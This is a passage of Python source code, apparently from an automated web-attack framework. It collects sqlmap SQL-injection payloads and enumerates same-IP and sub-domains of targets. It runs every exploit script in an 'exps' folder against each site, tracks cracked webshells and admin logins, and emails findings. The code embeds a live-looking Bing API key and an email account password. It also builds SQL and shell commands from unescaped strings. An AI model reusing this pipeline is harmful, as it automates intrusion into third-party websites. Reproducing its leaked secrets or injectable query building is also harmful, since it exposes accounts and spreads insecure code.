    print(sql_result1)
    sql_result2 = execute_sql_in_db(sql2, eval(get_key_value_from_config_file('config.ini','default','db_name')))
    print(sql_result2)
    if len(sql_result1) > 0:
        http_domain = sql_result1[0]
        tmp_table_name = eval(get_key_value_from_config_file('config.ini','default','targets_table_name'))
    elif len(sql_result2) > 0:
        http_domain = sql_result2[0]
        tmp_table_name = eval(get_key_value_from_config_file('config.ini','default','first_targets_table_name'))
    else:
        print("may be your select from db does not return the data you want,check it")
        print(8888888888)
        input()
    url = re.sub(r"(\s)$", "", url)
    if url[:4] == 'http':
        import urllib.parse
        parsed = urllib.parse.urlparse(url)
        domain = parsed.hostname
    else:
        domain = url
    target_folder = "/root/.sqlmap/output/" + domain
    try:
        f = open(target_folder + '/log', "r+")
        log = f.read()
        f.close()
    except:
        print("%s not exist" % target_folder)
        return ""
    find_payload_pattern = re.compile(r"Payload:.*", re.I)
    find_payload = re.findall(find_payload_pattern, log)
    find_payload_pattern = re.compile(r"Payload:.*", re.I)
    find_payload = re.findall(find_payload_pattern, log)
    if len(log) > 0 and find_payload:
        payload_result = ""
        return_payload = []
        for each in find_payload:
            if each not in return_payload:
                return_payload.append(each)
        for each in return_payload:
            payload_result += (each + '\n')
        payload_result = payload_result[:-1]

        with open(target_folder + '/target.txt', "r+") as f:
            domain_result = f.read()
            save_result = domain_result + '\n' + \
                payload_result + '\nsource domain:' + source_domain
            if source_domain[:4] == "http":
                http_domain = source_domain
            # 没有http开头的domain格式
            elif source_domain[:4] != "http" and len(source_domain) > 4:
                http_domain = tmp_table_name
            else:
                print("get source domain of target slqi url wrong,check it")

        auto_write_string_to_sql(
            sqlmap_result,
            eval(get_key_value_from_config_file('config.ini','default','db_name')),
            table_name,
            "sqlis",
            "http_domain",
            http_domain)
        target_or_pang_or_sub_urls_table_name = domain.replace(
            ".", "_") + "_urls"
        auto_write_string_to_sql(
            1,
            eval(get_key_value_from_config_file('config.ini','default','db_name')),
            target_or_pang_or_sub_urls_table_name,
            "has_sqli",
            "url",
            url)
        return save_result
    else:
        return ""


def get_scan_finished(scaned_column_name, db, table, http_domain_value):
    # 检测扫描是否完成,返回结果为0或1,0代表没有扫描完,1代表扫描完成
    # scaned_column_name代表对应是否扫描完的字段
    # http_domain_value为表的主键值,http_domain列对应的值
    sql = "select %s from %s where http_domain='%s'" % (
        scaned_column_name, table, http_domain_value)
    result = execute_sql_in_db(sql, db)
    if len(result) > 0:
        if result[0][0] == '1':
            return 1
    return 0


def set_scan_finished(scaned_column_name, db, table, http_domain_value):
    # 设置相应的扫描完成列值为1代表扫描完成,参数意义同上一个函数
    sql = "update %s set %s='%s' where %s='%s'" % (
        table, scaned_column_name, str(1), "http_domain", http_domain_value)
    execute_sql_in_db(sql, db)


def get_one_target_from_db(db, target_table):
    # 从数据库db中的target表中按优先级取出目标
    if eval(get_key_value_from_config_file('config.ini','default','scan_way')) == 1:
        sql = "select http_domain from %s where scan_finished='0' or pang_domains_scan_finished='0' limit 1" \
            % target_table
    elif eval(get_key_value_from_config_file('config.ini','default','scan_way')) == 2:
        sql = "select http_domain from %s where scan_finished='0' or sub_domains_scan_finished='0' limit 1" \
            % target_table
    elif eval(get_key_value_from_config_file('config.ini','default','scan_way')) == 3:
        sql = "select http_domain from % s where scan_finished = '0' or pang_domains_scan_finished = '0' or \
                sub_domains_scan_finished = '0' limit 1" % target_table
    elif eval(get_key_value_from_config_file('config.ini','default','scan_way')) == 4:
        sql = "select http_domain from %s where scan_finished='0' limit 1" % target_table
    else:
        print("eval(get_key_value_from_config_file('config.ini','default','scan_way')) error in get_one_target_from_db func")
    result = execute_sql_in_db(sql, db)
    if len(result) > 0:
        return result[0][0]
    else:
        # result will be ()
        return None


def get_http_or_https(domain):
    # 获取domain对应的scheme,如获取www.baidu.com对应的scheme为https,此功能待完善
    _1 = get_request("http://" + domain)
    http_title = _1['title']
    http_code = _1['code']
    _2 = get_request("https://" + domain)
    https_title = _2['title']
    https_code = _2['code']
    if http_title == https_title:
        return "https"
    else:
        if http_code == 200 and https_code != 200:
            return "http"
        if https_code == 200 and http_code != 200:
            return "https"
    return "http"


def getIp(domain):
    # 从domain中获取ip
    import socket
    try:
        myaddr = socket.getaddrinfo(domain, 'http')[0][4][0]
        return myaddr
    except:
        print("getip wrong")


def get_pure_list(list):
    # this is a function to remove \r\n or \n from one sting
    # 得到域名列表
    pure_list = []
    for each in list:
        each = re.sub(r'(https://)|(http://)|(\s)|(/.*)|(:.*)', "", each)
        pure_list.append(each)
        # re.sub(r'\r\n',"",each)
        # re.sub(r'\n',"",each)
    return pure_list


def save_url_to_file(url_list, name):
    # this is my write url to file function:
    file = open(name, "a+")
    file.close()
    for ur in url_list:
        file = open(name, "r+")
        all_lines = file.readlines()
        # print(all_lines)
        # print((len(all_lines)))
        file.close()
        # if ur+"\r\n" not in all_lines:
        if ur + "\n" not in all_lines:
            file = open(name, "a+")
            file.write(ur + "\r\n")
            file.flush()
            file.close()


def bing_search(query, search_type):
    # the main function to search use bing api
    # search_type: Web, Image, News, Video
    key = 'ijQjrTvnTQHYbkqmvS37IzqjHSLXWJxzPQltVXvV35E'
    query = urllib.parse.quote(query)
    # print "bing_search s query is %s" % query
    # create credential for authentication
    user_agent = 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)'
    import base64
    credentials = str(base64.b64encode((':%s' % key).encode('utf-8')), 'utf-8')
    auth = 'Basic %s' % credentials
    print(auth)
    url = 'https://api.datamarket.azure.com/Data.ashx/Bing/Search/' + search_type + \
        '?Query=%27' + query + '%27&$top=100&$format=json'  # &$top=5&$format=json'
    request = urllib.request.Request(url)
    request.add_header('Authorization', auth)
    request.add_header('User-Agent', user_agent)
    request_opener = urllib.request.build_opener()
    response = request_opener.open(request)
    # python2下后面没有decode('utf-8'),python3下要加decode('utf-8')
    response_data = response.read().decode('utf-8')
    import json
    json_result = json.loads(response_data)
    result_list = json_result['d']['results']
    return result_list


def get_pang_domains(target):
    # 得到target的旁站列表
    # target为如http://www.baidu.com的域名,含http
    if target[:4] == "http":
        domain = target.split("/")[-1]
    else:
        print("please make sure param has scheme http or https")
        return
    main_target_table_name = get_main_target_table_name(target)
    result = execute_sql_in_db(
        "select get_pang_domains_finished from %s where http_domain='%s'" %
        (main_target_table_name, target), eval(get_key_value_from_config_file('config.ini','default','db_name')))
    if len(result) > 0:
        if result[0][0] == '0':
            pass
        elif result[0][0] == '1':
            return
        else:
            print(
                "error in get_pang_domains_finished column in table %s" %
                main_target_table_name)
    else:
        print("get_pang_domains error in execute_sql_in_db")
    if eval(get_key_value_from_config_file('config.ini','default','scan_way')) in [1, 3]:
        pass
    else:
        return
    figlet2file("geting pang domains", 0, True)
    print(target)

    import os
    if False == os.path.exists("log"):
        os.system("mkdir log")
    if False == os.path.exists("log/pang"):
        os.system("cd log && mkdir pang")
    domain_pang_file = "log/pang/%s_pang.txt" % domain.replace(".", "_")
    domain_pang_table_name = domain_pang_file[9:-4]
    import os
    import socket
    if os.path.exists(domain_pang_file):
        # 文件存在说明上次已经获取过旁站结果
        print("you have got the pang domains last time")
        # 如果数据库中存在对应表,但没有内容,说明数据库中表被删除,
        # 后来由于database_init函数在auto_attack重新运行时被执行,又有了旁站表
        # 此时旁站表为空将文件中的旁站写入数据库中
        result = execute_sql_in_db(
            "select http_domain from %s" %
            domain_pang_table_name, eval(get_key_value_from_config_file('config.ini','default','db_name')))
        if len(result) == 0:
            with open(domain_pang_file, "r+") as f:
                for each in f:
                    each = re.sub(r"(\s)$", "", each)
                    if each != target:
                        execute_sql_in_db("insert into %s(http_domain,domain) values('%s','%s')" % (
                            domain_pang_table_name, each, each.split("/")[-1]), eval(get_key_value_from_config_file('config.ini','default','db_name')))
                        auto_write_string_to_sql(
                            each,
                            eval(get_key_value_from_config_file('config.ini','default','db_name')),
                            main_target_table_name,
                            "pang_domains",
                            "http_domain",
                            target)

                        # 创建除目标domain外的每个旁站的urls表,因为目标domain的urls表之前已经创建过
                        each_pang_urls_table_name = each.split(
                            '/')[-1].replace(".", "_") + "_urls"
                        sql = "create table %s(url varchar(250) not null primary key,code varchar(50) not null,\
title varchar(200) not null,content mediumtext not null,has_sqli varchar(50) not null,\
is_upload_url varchar(50) not null,\
like_webshell_url varchar(50) not null default 0,\
cracked_webshell_url_info varchar(50) not null,\
like_admin_login_url varchar(50) not null,\
cracked_admin_login_url_info varchar(50) not null,\
http_domain varchar(70) not null)" % each_pang_urls_table_name
                        execute_sql_in_db(sql, eval(get_key_value_from_config_file('config.ini','default','db_name')))
        else:
            return

    else:
        domain_list = []
        http_domain_list = []
        origin_http_domain_url_list = []
        ip = getIp(domain)
        print(domain)
        all_nics_ip = socket.gethostbyname_ex(domain)[2]
        query = "ip:%s" % ip
        for piece in bing_search(query, 'Web'):
            if "https://" in piece['Url']:
                each_domain = piece['Url'][8:-1].split('/')[0]
                if each_domain not in domain_list and getIp(
                        each_domain) in all_nics_ip:
                    domain_list.append(each_domain)
                    http_domain_list.append("https://" + each_domain)
                    origin_http_domain_url_list.append(piece['Url'])
            else:
                each_domain = piece['Url'][7:-1].split('/')[0]
                if each_domain not in domain_list and getIp(
                        each_domain) in all_nics_ip:
                    domain_list.append(each_domain)
                    http_domain_list.append("http://" + each_domain)
                    origin_http_domain_url_list.append(piece['Url'])
        print(http_domain_list)
        import os
        save_url_to_file(http_domain_list, domain_pang_file)
        for each in http_domain_list:
            each = re.sub(r"(\s)$", "", each)
            if each != target:
                execute_sql_in_db("insert into %s(http_domain,domain) values('%s','%s')" % (
                    domain.replace(".", "_") + '_pang', each, each.split('/')[-1]), eval(get_key_value_from_config_file('config.ini','default','db_name')))
                # 创建除目标domain外的每个旁站的urls表,因为目标domain的urls表之前已经创建过
                each_pang_urls_table_name = each.split(
                    '/')[-1].replace(".", "_") + "_urls"
                sql = "create table %s(url varchar(250) not null primary key,code varchar(50) not null,\
title varchar(200) not null,content mediumtext not null,has_sqli varchar(50) not null,\
is_upload_url varchar(50) not null,\
like_webshell_url varchar(50) not null default 0,\
cracked_webshell_url_info varchar(50) not null,\
like_admin_login_url varchar(50) not null,\
cracked_admin_login_url_info varchar(50) not null,\
http_domain varchar(70) not null)" % each_pang_urls_table_name
                execute_sql_in_db(sql, eval(get_key_value_from_config_file('config.ini','default','db_name')))
        f = open(domain_pang_file, "r+")
        all = f.read()
        f.close()
        find_http_domain = re.search(r"(http(s)?://%s)" % re.sub(r"\.", "\.", domain), all)
        http_domain = ""
        if find_http_domain:
            http_domain = find_http_domain.group(1)
        else:
            print("can not find http_domain in %s" % domain_pang_file)
        pang_domains = ""
        for each in http_domain_list:
            if re.sub(r"(\s)$", "", each) != target:
                pang_domains += (each + '\n')
        auto_write_string_to_sql(
            pang_domains,
            eval(get_key_value_from_config_file('config.ini','default','db_name')),
            main_target_table_name,
            "pang_domains",
            "http_domain",
            http_domain)
    execute_sql_in_db(
        "update %s set get_pang_domains_finished='1' where http_domain='%s'" %
        (main_target_table_name, target), eval(get_key_value_from_config_file('config.ini','default','db_name')))


def get_root_domain(domain):
    # 得到domain的根域名,eg.www.baidu.com得到baidu.com
    # domain可为http开头或纯domain,不能是非http://+domain的url
    if domain[:4] == "http":
        domain = domain.split("/")[-1]
    split_list = domain.split(".")
    max_len = 0
    for each in split_list:
        if len(each) >= max_len:
            max_len = len(each)
            key_word = each
    # print(key_word)
    return_value = re.search(r".*(%s.*)" % key_word, domain).group(1)
    return return_value


def get_sub_domains(target, use_tool="Sublist3r"):
    # target为http开头+domain
    # 注意target(http://www.baidu.com)要换成如baidu.com的结果,然后再当作参数传入下面可能用的工具中
    # www.baidu.com--->baidu.com,baidu.com是下面工具的参数
    # use_tool为子站获取工具选择
    # Sublist3r工具详情如下
    # 获取子站列表,domain为域名格式,不含http
    # https://github.com/aboul3la/Sublist3r
    # works in python2,use os.system get the execute output
    if target[:4] == "http":
        domain = target.split("/")[-1]
    else:
        print("make sure your para in get_sub_domains func has scheme like http or https")
        return
    main_target_table_name = get_main_target_table_name(target)
    result = get_scan_finished(
        "get_sub_domains_finished",
        eval(get_key_value_from_config_file('config.ini','default','db_name')),
        main_target_table_name,
        target)
    if result == 1:
        return
    if result == 0:
        pass
    if eval(get_key_value_from_config_file('config.ini','default','scan_way')) in [2, 3]:
        pass
    else:
        return
    figlet2file("geting sub domains", 0, True)

    root_domain = get_root_domain(domain)
    if os.path.exists("log") == False:
        os.system("mkdir log")
    if os.path.exists("log/sub") == False:
        os.system("cd log && mkdir sub")
    store_file = "log/sub/" + domain.replace(".", "_") + "_sub.txt"
    Sublist3r_store_file = "Sublist3r.out.txt"
    subDomainsBrute_store_file = "subDomainsBrute.out.txt"
    sub_domains_table_name = domain.replace(".", "_") + "_sub"

    def Sublist3r(domain):
        # 用Sublist3r方式获取子站
        if os.path.exists("Sublist3r") == False:
            os.system("git clone https://github.com/aboul3la/Sublist3r.git")
            # 下面的cd到一个目录只在一句代码中有效,执行完就不在Sublist3r目录里了
            os.system("cd Sublist3r && pip install -r requirements.txt")
            # 下面的命令执行不受上面的cd到一个目录影响
            os.system("cd Sublist3r && python sublist3r.py -v -d %s -o %s" %
                      (root_domain, Sublist3r_store_file))
        else:
            os.system("cd Sublist3r && python sublist3r.py -v -d %s -o %s" %
                      (root_domain, Sublist3r_store_file))

    def subDomainsBrute(domain):
        # 用subDomainsBrute方式获取子站
        # https://github.com/lijiejie/subDomainsBrute.git
        if os.path.exists("subDomainsBrute") == False:
            os.system("git clone https://github.com/lijiejie/subDomainsBrute.git")
            os.system("pip install dnspython")
            os.system(
                "cd subDomainsBrute && python subDomainsBrute.py -i -o %s %s" %
                (subDomainsBrute_store_file, root_domain))
        else:
            os.system(
                "cd subDomainsBrute && python subDomainsBrute.py -i -o %s %s" %
                (subDomainsBrute_store_file, root_domain))

    if os.path.exists(store_file) == False:

        if use_tool == "all":
            Sublist3r(root_domain)
            os.system(
                "cat Sublist3r/%s >> %s" %
                (Sublist3r_store_file, store_file))
            os.system("rm Sublist3r/%s" % Sublist3r_store_file)
            subDomainsBrute(root_domain)
            with open("subDomainsBrute/%s" % subDomainsBrute_store_file, "r+") as f:
                with open(store_file, "a+") as outfile:
                    for each in f:
                        if each not in outfile.readlines():
                            outfile.write(each)
            os.system("rm subDomainsBrute/%s" % subDomainsBrute_store_file)
        if use_tool == "Sublist3r":
            Sublist3r(domain)
            os.system(
                "cat Sublist3r/%s >> %s" %
                (Sublist3r_store_file, store_file))
            os.system("rm Sublist3r/%s" % Sublist3r_store_file)
        if use_tool == "subDomainsBrute":
            subDomainsBrute(domain)
            os.system("cat subDomainsBrute/%s >> %s" %
                      (subDomainsBrute_store_file, store_file))
            os.system("rm subDomainsBrute/%s" % subDomainsBrute_store_file)

    else:
        # 文件存在说明上次已经获取sub domains
        print("you have got the sub domains last time")
        result = execute_sql_in_db(
            "select http_domain from %s" %
            sub_domains_table_name, eval(get_key_value_from_config_file('config.ini','default','db_name')))

        if len(result) == 0:
            pass
        else:
            return

    with open(store_file, "r+") as f:
        for each in f:
            each = re.sub(r"(\s)$", "", each)
            # 注意这里和旁站处理不同,因为这里获得的子站没有http开头,文件和数据库中的对应值都没有http开头
            if each != target.split("/")[-1]:
                write_string_to_sql(
                    each,
                    eval(get_key_value_from_config_file('config.ini','default','db_name')),
                    main_target_table_name,
                    "sub_domains",
                    "domain",
                    domain)
                execute_sql_in_db(
                    "insert ignore into %s(http_domain,domain) values('%s','%s')" %
                    (sub_domains_table_name,
                     get_http_or_https(each) +
                     "://" +
                     each,
                     each),
                    eval(get_key_value_from_config_file('config.ini','default','db_name')))

                # 创建每个sub domain的urls表,eg,wit_freebuf_com_urls
                # 这里创建sub domain的urls表和pang domain的urls表的创建的具体创建方法不一样,创建pang domain的
                # urls表的时候分了两种不同情况下[本地文件存在和本地文件不存在的两种情况]分别创建urls表,这里统一
                # 创建urls表,不管本地文件是否存在,也即不管上次有没有已经获取过sub domains,这里的处理方法更好,代
                # 码更短,这里额外加上如果urls表存在则不创建urls表的判断,因为例如在scan_way=3且旁站和子站有重叠
                # 的时候由于先进入的get_pang_domains函数运行后已经创建了urls表,重叠的站对应的urls表会在此时再次
                # 创建,所以加上这个情况的判断用来容错
                each_sub_urls_table_name = each.replace(".", "_") + "_urls"
                sql = "create table %s(url varchar(250) not null primary key,code varchar(50) not null,\
title varchar(200) not null,content mediumtext not null,has_sqli varchar(50) not null,\
is_upload_url varchar(50) not null,\
like_webshell_url varchar(50) not null default 0,\
cracked_webshell_url_info varchar(50) not null,\
like_admin_login_url varchar(50) not null,\
cracked_admin_login_url_info varchar(50) not null,\
http_domain varchar(70) not null)" % each_sub_urls_table_name
                if False == exist_table_in_db(
                        each_sub_urls_table_name, eval(get_key_value_from_config_file('config.ini','default','db_name'))):
                    execute_sql_in_db(sql, eval(get_key_value_from_config_file('config.ini','default','db_name')))

    execute_sql_in_db(
        "update %s set get_sub_domains_finished='1' where http_domain='%s'" %
        (main_target_table_name, target), eval(get_key_value_from_config_file('config.ini','default','db_name')))


def get_main_target_table_name(target):
    # 得到主要目标的数据库中所在表的名字,结果为eval(get_key_value_from_config_file('config.ini','default','targets_table_name'))或eval(get_key_value_from_config_file('config.ini','default','first_targets_table_name'))
    # 由于主要目标存放在eval(get_key_value_from_config_file('config.ini','default','targets_table_name'))或eval(get_key_value_from_config_file('config.ini','default','first_targets_table_name'))当中,所以这样检测
    # target可为domain或http domain格式
    if target[:4] == "http":
        domain = target.split("/")[-1]
    else:
        domain = target
    result1 = execute_sql_in_db(
        "select * from %s where domain='%s'" %
        (eval(get_key_value_from_config_file('config.ini','default','targets_table_name')), domain), eval(get_key_value_from_config_file('config.ini','default','db_name')))
    result2 = execute_sql_in_db(
        "select * from %s where domain='%s'" %
        (eval(get_key_value_from_config_file('config.ini','default','first_targets_table_name')), domain), eval(get_key_value_from_config_file('config.ini','default','db_name')))
    if len(result1) > 0:
        return eval(get_key_value_from_config_file('config.ini','default','targets_table_name'))
    elif len(result2) > 0:
        return eval(get_key_value_from_config_file('config.ini','default','first_targets_table_name'))
    else:
        print("get_main_target_table_name error,check your select code")


def get_target_table_name_list(target):
    # 得到target所在的表名,检索的表包括targets,first_targets,xxx_pang,xxx_sub
    # 返回一个列表,如果target是主要目标,则该列表中只有一个表名,targets或是first_targets
    # 如果target是子站或旁站且该子站如wit.freebuf.com既是子站又是旁站值,则返回的列表中有两个表名,xxx_pang和
    # xxx_sub

    url_belong_to_main_target = [False]
    # url属于哪个主目标(非旁站子站的那个目标)
    # 如http://wit.freebuf.com得到www.freebuf.com
    url_main_target = [get_url_belong_main_target_domain(target)]
    # eg.www_freebuf_com_pang
    url_main_target_pang_table_name = url_main_target[
        0].replace(".", "_") + "_pang"
    # eg.www_freebuf_com_sub
    url_main_target_sub_table_name = url_main_target[
        0].replace(".", "_") + "_sub"
    current_not_main_target_table_name = []
    if url_main_target[0] == get_http_domain_from_url(target).split('/')[-1]:
        # 说明该url是目标url，不是目标的某个旁站或子站url
        table_name = [
            get_main_target_table_name(
                get_http_domain_from_url(target))]
        url_belong_to_main_target = [True]
        return_value = table_name
    else:
        pang_table_exists = False
        sub_table_exists = False
        if True == exist_table_in_db(
                url_main_target_pang_table_name,
                eval(get_key_value_from_config_file('config.ini','default','db_name'))):
            pang_table_exists = True
            result1 = execute_sql_in_db(
                "select * from %s where http_domain='%s'" %
                (url_main_target_pang_table_name,
                 get_http_domain_from_url(target)),
                eval(get_key_value_from_config_file('config.ini','default','db_name')))
            if len(result1) > 0:
                current_not_main_target_table_name.append(
                    url_main_target_pang_table_name)
        if True == exist_table_in_db(
                url_main_target_sub_table_name,
                eval(get_key_value_from_config_file('config.ini','default','db_name'))):
            sub_table_exists = True
            result2 = execute_sql_in_db(
                "select * from %s where http_domain='%s'" %
                (url_main_target_sub_table_name,
                 get_http_domain_from_url(target)),
                eval(get_key_value_from_config_file('config.ini','default','db_name')))
            if len(result2) > 0:
                current_not_main_target_table_name.append(
                    url_main_target_sub_table_name)
        return_value = current_not_main_target_table_name
        # 有种情况下,非主要目标的url存储信息的表在主要目标的旁站表和子站表中都存在,
        # 也即该url既是旁站url又是子站url,eg.wit.freebuf.com既是旁站又是子站
    return return_value


def get_column_value_from_main_target_table():
    pass


def single_risk_scan(target):
    # 单个target高危exp遍历模块
    # target要求为http(s)+domain格式
    # risk_scan模块对每个target,无论是主要目标的旁站还是子站,都进行详细的判断target是否是主要目标,并在对应的表
    # 中记录risk_scaned的完成状态
    # 这里的target不一定是主要目标,可以是旁站或子站
    import os
    table_name_list = get_target_table_name_list(target)
    # url属于哪个主目标(非旁站子站的那个目标)
    # 如http://wit.freebuf.com得到www.freebuf.com
    # eg.www_freebuf_com_pang

    if 1 == get_scan_finished(
        "dirb_scaned",
        eval(get_key_value_from_config_file('config.ini','default','db_name')),
        table_name_list[0],
            target):
        return
    else:
        pass

    exp_list = os.listdir("exps")
    for each in exp_list:
        command = "cd exps/%s && python3 %s.py %s" % (each, each, target)
        os.system(command)
        if os.path.exists("exps/%s/result.txt" % each):
            with open("exps/%s/result.txt", "r+") as f:
                strings_to_write = f.read()
        else:
            strings_to_write = ""

        for each_table in table_name_list:
            write_string_to_sql(strings_to_write, eval(get_key_value_from_config_file('config.ini','default','db_name')), each_table,
                                "risk_scan_info", "http_domain", target)
            execute_sql_in_db(
                "update %s set risk_scaned='1' where http_domain='%s'" %
                (each_table, target), eval(get_key_value_from_config_file('config.ini','default','db_name')))

        if len(strings_to_write) != 0:
            mail_msg_to(
                strings_to_write,
                "2784046065@qq.com",
                "risk info",
                "18137062539@163.com",
                "063913ok")


def risk_scan(target):
    # target should start with http
    # 根据scan_way的不同而不同的高危exp扫描模块
    # 这里的target是主要目标
    main_target_table_name = get_main_target_table_name(target)
    if 1 == get_scan_finished(
        "risk_scaned",
        eval(get_key_value_from_config_file('config.ini','default','db_name')),
        main_target_table_name,
            target):
        pass
    else:
        single_risk_scan(target)

    if eval(get_key_value_from_config_file('config.ini','default','scan_way')) == 1:
        if 1 == get_scan_finished(
            "pang_domains_risk_scaned",
            eval(get_key_value_from_config_file('config.ini','default','db_name')),
            main_target_table_name,
                target):
            return
        else:
            pass
        result = execute_sql_in_db("select http_domain from %s" % target.split(
            "/")[-1].replace(".", "_") + "_pang", eval(get_key_value_from_config_file('config.ini','default','db_name')))
        if len(result) > 0:
            for each in result:
                single_risk_scan(each[0])
            execute_sql_in_db(
                "update %s set pang_domains_risk_scaned='1' where http_domain='%s'" %
                (main_target_table_name, target), eval(get_key_value_from_config_file('config.ini','default','db_name')))
        else:
            print("risk_scan execute_sql_in_db error,check it")
    elif eval(get_key_value_from_config_file('config.ini','default','scan_way')) == 2:
        if 1 == get_scan_finished(
            "sub_domains_risk_scaned",
            eval(get_key_value_from_config_file('config.ini','default','db_name')),
            main_target_table_name,
                target):
            return
        else:
            pass
        result = execute_sql_in_db("select http_domain from %s" % target.split(
            "/")[-1].replace(".", "_") + "_sub", eval(get_key_value_from_config_file('config.ini','default','db_name')))
        if len(result) > 0:
            for each in result:
                single_risk_scan(each[0])
            execute_sql_in_db(
                "update %s set sub_domains_risk_scaned='1' where http_domain='%s'" %
                (main_target_table_name, target), eval(get_key_value_from_config_file('config.ini','default','db_name')))
        else:
            print("risk_scan execute_sql_in_db error,check it")

    elif eval(get_key_value_from_config_file('config.ini','default','scan_way')) == 3:
        if 1 == get_scan_finished(
                "pang_domains_risk_scaned",
                eval(get_key_value_from_config_file('config.ini','default','db_name')),
                main_target_table_name,
                target) and 1 == get_scan_finished(
                "sub_domains_risk_scaned",
                eval(get_key_value_from_config_file('config.ini','default','db_name')),
                main_target_table_name,
                target):
            return
        else:
            pass

        if 1 == get_scan_finished(
            "pang_domains_risk_scaned",
            eval(get_key_value_from_config_file('config.ini','default','db_name')),
            main_target_table_name,
                target):
            return
        else:
            pass
        result = execute_sql_in_db("select http_domain from %s" % target.split(
            "/")[-1].replace(".", "_") + "_pang", eval(get_key_value_from_config_file('config.ini','default','db_name')))
        if len(result) > 0:
            for each in result:
                single_risk_scan(each[0])
            execute_sql_in_db(
                "update %s set pang_domains_risk_scaned='1' where http_domain='%s'" %
                (main_target_table_name, target), eval(get_key_value_from_config_file('config.ini','default','db_name')))
        else:
            print("risk_scan execute_sql_in_db error,check it")

        if 1 == get_scan_finished(
            "sub_domains_risk_scaned",
            eval(get_key_value_from_config_file('config.ini','default','db_name')),
            main_target_table_name,
                target):
            return
        else:
            pass
        result = execute_sql_in_db("select http_domain from %s" % target.split(
            "/")[-1].replace(".", "_") + "_sub", eval(get_key_value_from_config_file('config.ini','default','db_name')))
        if len(result) > 0:
            for each in result:
                single_risk_scan(each[0])
            execute_sql_in_db(
                "update %s set sub_domains_risk_scaned='1' where http_domain='%s'" %
                (main_target_table_name, target), eval(get_key_value_from_config_file('config.ini','default','db_name')))
        else:
            print("risk_scan execute_sql_in_db error,check it")


def is_wrong_html(html):
    import re
    pattern = re.compile(
        r".*((sorry)|(不存在)|(not exist)|(page not found)|(抱歉)).*", re.I)
    # pattern=re.compile(r"不存在")
    if re.search(pattern, html):
        return True
    else:
        return False


def get_target_script_type(target):
    # 得到target的脚本类型
    # target要是http(s)+domain格式
    # 此处不考虑html静态类型,如果没有找到,默认返回php
    from concurrent import futures
    target = [target]
    name_list = [
        'index',
        'main',
        'info',
        'default',
        'start',
        'login',
        'admin',
        'menu',
        'test',
        'base',
        'config',
        'about',
        'configuration',
        '1',
        'l',
        'tmp']
    script_type_list = ['php', 'asp', 'aspx', 'jsp']
    return_value = []

    def check_uri(uri):
        if uri.split(".")[-1] in return_value:
            return
        result = get_request(target[0] + uri)
        if 200 == result['code'] and False == is_wrong_html(result['content']):
            if uri.split(".")[-1] not in return_value:
                return_value.append(uri.split(".")[-1])

    def check_with_type(type):
        type = [type]
        new_name_list = []

        def make_uri(name):
            new_name_list.append("/" + name + "." + type[0])

        with futures.ThreadPoolExecutor(max_workers=20) as executor:
            executor.map(make_uri, name_list)

        with futures.ThreadPoolExecutor(max_workers=20) as executor:
            executor.map(check_uri, new_name_list)

    with futures.ThreadPoolExecutor(max_workers=20) as executor:
        executor.map(check_with_type, script_type_list)

    if return_value == []:
        return_value.append('php')

    return return_value


def single_script_type_scan(target):
    # 对一个target进行脚本类型识别,这里的target可以为主要目标,也可以为主要目标的旁站或子站

    figlet2file("script type scaning...", 0, True)
    print(target)
    import os
    table_name_list = get_target_table_name_list(target)
    if 1 == get_scan_finished(
        "script_type_scaned",
        eval(get_key_value_from_config_file('config.ini','default','db_name')),
        table_name_list[0],
            target):
        if len(table_name_list) == 2:
            if get_scan_finished(
                "script_type_scaned",
                eval(get_key_value_from_config_file('config.ini','default','db_name')),
                table_name_list[1],
                    target) == 0:
                set_scan_finished(
                    "script_type_scaned",
                    eval(get_key_value_from_config_file('config.ini','default','db_name')),
                    table_name_list[1],
                    target)
        else:
            print("execute_sql_in_db error in single_script_type_scan")
    else:
        script_type = get_target_script_type(target)
        if len(script_type) > 1:
            for each in script_type:
                # 如果type类型不止一个,则多个中间用","分隔
                tmp = each + ","
            script_type_value = tmp[:-1]
        elif len(script_type) == 1:
            script_type_value = script_type[0]
        else:
            print("script_type wrong in single_script_type_scan func,check it")
        # script_type(是list)有可能是多种类型(aps&&php),但概率较小
        for each_table in table_name_list:
            execute_sql_in_db(
                "update %s set script_type='%s' where http_domain='%s'" %
                (each_table, script_type_value, target), eval(get_key_value_from_config_file('config.ini','default','db_name')))
            set_scan_finished(
                "script_type_scaned",
                eval(get_key_value_from_config_file('config.ini','default','db_name')),
                each_table,
                target)


def script_type_scan(target):
    # 根据scan_way的值对target进行脚本类型识别扫描
    main_target_table_name = get_main_target_table_name(target)
    http_domain_script_type_scaned = get_scan_finished(
        "script_type_scaned", eval(get_key_value_from_config_file('config.ini','default','db_name')), main_target_table_name, target)
    pang_domains_script_type_scaned = get_scan_finished(
        "pang_domains_script_type_scaned",
        eval(get_key_value_from_config_file('config.ini','default','db_name')),
        main_target_table_name,
        target)
    sub_domains_script_type_scaned = get_scan_finished(
        "sub_domains_script_type_scaned",
        eval(get_key_value_from_config_file('config.ini','default','db_name')),
        main_target_table_name,
        target)
    if http_domain_script_type_scaned == 1 and pang_domains_script_type_scaned == 1 and sub_domains_script_type_scaned == 1:
        return
    else:
        if http_domain_script_type_scaned == 0:
            single_script_type_scan(target)
        elif http_domain_script_type_scaned == 1:
            print("main target script type scaned")
            pass
        else:
            print("get_scan_finished error in script_type_scan func")
        if eval(get_key_value_from_config_file('config.ini','default','scan_way')) == 1:
            if pang_domains_script_type_scaned == 1:
                return
            # 从数据库中获取target的旁站列表
            sql = "select http_domain from %s" % target.split(
                "/")[-1].replace(".", "_") + "_pang"
            result = execute_sql_in_db(sql, eval(get_key_value_from_config_file('config.ini','default','db_name')))
            if len(result) > 0:
                for each in result:
                    if each[0] != "":
                        script_type_scaned = get_scan_finished("script_type_scaned", eval(get_key_value_from_config_file('config.ini','default','db_name')), target.split(
                            "/")[-1].replace(".", "_") + "_pang", each[0])
                        if script_type_scaned == 0:
                            single_script_type_scan(each[0])
                    else:
                        print(
                            "script_type_scan func's each[0] error in scan_way 1")
                set_scan_finished(
                    "pang_domains_script_type_scaned",
                    eval(get_key_value_from_config_file('config.ini','default','db_name')),
                    main_target_table_name,
                    target)
            else:
                print("script_type_scan func's %s error" % sql)
        elif eval(get_key_value_from_config_file('config.ini','default','scan_way')) == 2:
            if sub_domains_script_type_scaned == 1:
                return
            # 从数据库中获取target的子站列表
            sql = "select http_domain from %s" % target.split(
                "/")[-1].replace(".", "_") + "_sub"
